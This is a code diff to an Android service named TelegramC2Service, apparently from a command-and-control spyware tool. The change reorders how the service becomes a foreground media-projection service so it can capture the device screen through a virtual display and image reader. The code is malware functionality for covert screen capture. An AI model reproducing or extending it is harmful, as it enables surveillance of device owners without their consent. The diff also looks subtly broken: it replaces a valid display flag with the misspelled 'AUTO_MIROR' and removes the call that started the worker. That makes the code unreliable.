@@ -115,26 +115,36 @@ public class TelegramC2Service extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if (intent != null && "ACTION_SCREENSHOT_RESULT".equals(intent.getAction())) {
-            int resultCode = intent.getIntExtra("resultCode", Activity.RESULT_CANCELED);
-            Intent resultData = intent.getParcelableExtra("resultData");
-            handleScreenshotResult(resultCode, resultData);
-        } else {
-            try {
-                startWorker();
-            } catch (Exception e) {
-                ErrorLogger.logError(this, "TelegramC2Service_OnStart", e);
+        if (intent != null) {
+            String action = intent.getAction();
+            if ("ACTION_PREPARE_SCREENSHOT".equals(action)) {
+                // FIXED: Promote service first, then launch activity
+                prepareAndLaunchScreenshot();
+            } else if ("ACTION_SCREENSHOT_RESULT".equals(action)) {
+                int resultCode = intent.getIntExtra("resultCode", Activity.RESULT_CANCELED);
+                Intent resultData = intent.getParcelableExtra("resultData");
+                handleScreenshotResult(resultCode, resultData);
             }
         }
         return START_STICKY;
     }
 
-    private void handleScreenshotResult(int resultCode, Intent data) {
+    private void prepareAndLaunchScreenshot() {
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 startForeground(NOTIFICATION_ID, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
             }
+            // Now that the service is in the correct state, launch the activity
+            Intent intent = new Intent(this, ScreenshotActivity.class);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+        } catch (Exception e) {
+            ErrorLogger.logError(this, "PrepareAndLaunchScreenshot", e);
+        }
+    }
 
+    private void handleScreenshotResult(int resultCode, Intent data) {
+        try {
             MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
             mediaProjection = projectionManager.getMediaProjection(resultCode, data);
             if (mediaProjection != null) {
@@ -156,7 +166,7 @@ public class TelegramC2Service extends Service {
         imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
         virtualDisplay = mediaProjection.createVirtualDisplay("ScreenCapture",
                 width, height, density,
-                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIROR,
                 imageReader.getSurface(), null, screenshotHandler);
 
         imageReader.setOnImageAvailableListener(reader -> {
